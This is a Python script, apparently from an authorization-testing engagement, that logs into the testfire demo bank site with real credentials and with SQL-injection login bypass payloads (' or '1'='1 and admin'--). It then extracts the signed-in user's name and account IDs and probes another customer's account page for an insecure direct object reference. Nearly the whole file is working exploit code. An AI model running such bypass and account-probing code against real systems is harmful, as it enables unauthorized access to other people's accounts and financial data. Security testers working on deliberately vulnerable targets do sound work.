#!/usr/bin/env python3
"""Identify WHO the SQLi-bypass session logs in as on demo.testfire.net.

- login as jsmith/demo1234 -> fetch /bank/main.jsp -> extract display name + accounts
- login via SQLi bypass     -> fetch /bank/main.jsp -> extract display name + accounts
If the two identities differ, we have TWO real users for the ENG-AUTHZ matrix.
"""
import http.cookiejar
import re
import urllib.request
import urllib.parse

BASE = "http://demo.testfire.net"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None

def session_login(user, pw):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    # prime
    op.open(urllib.request.Request(BASE + "/login.jsp", headers={"User-Agent": "sentinel-probe/2.8.0"}), timeout=30).read()
    # submit to doLogin
    data = urllib.parse.urlencode({"uid": user, "passw": pw, "btnSubmit": "Login"}).encode()
    req = urllib.request.Request(BASE + "/doLogin", data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "sentinel-probe/2.8.0")
    opn = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect())
    try:
        r = opn.open(req, timeout=30)
        loc = r.headers.get("Location", "")
        r.read()
    except urllib.error.HTTPError as e:
        loc = e.headers.get("Location", "")
        e.read()
    ok = "main.jsp" in loc
    return op, ok, loc

def get(op, path):
    with op.open(urllib.request.Request(BASE + path, headers={"User-Agent": "sentinel-probe/2.8.0"}), timeout=30) as r:
        return r.status, r.read().decode("utf-8", "replace")

def whoami(html):
    name = ""
    m = re.search(r"Signed In:\s*</span>\s*<span[^>]*>([^<]+)", html, re.I)
    if not m:
        m = re.search(r"(?:Hello|Welcome)[^<]{0,20}<b>?([^<]{2,40})", html, re.I)
    if m:
        name = m.group(1).strip()
    accts = re.findall(r"account=([0-9]+)", html)
    return name, sorted(set(accts))

for label, u, p in [("jsmith", "jsmith", "demo1234"),
                    ("sqli-bypass", "' or '1'='1", "x"),
                    ("sqli-admin", "admin'--", "x")]:
    op, ok, loc = session_login(u, p)
    if not ok:
        print(f"[{label}] LOGIN FAILED loc={loc}")
        continue
    st, html = get(op, "/bank/main.jsp")
    name, accts = whoami(html)
    print(f"[{label}] login OK -> {loc} | main.jsp status={st} | user={name!r} | account ids on page: {accts}")
    # also probe showAccount for a foreign account to confirm the IDOR surface
    st2, html2 = get(op, "/bank/showAccount?account=800001")
    m = re.search(r"<td[^>]*>\s*([0-9]{6})\s*</td>", html2)
    has_signoff = "sign off" in html2.lower()
    title = re.search(r"<title>([^<]+)", html2)
    print(f"    showAccount?account=800001 -> status={st2} title={title.group(1) if title else ''!r} sign_off={has_signoff} len={len(html2)}")
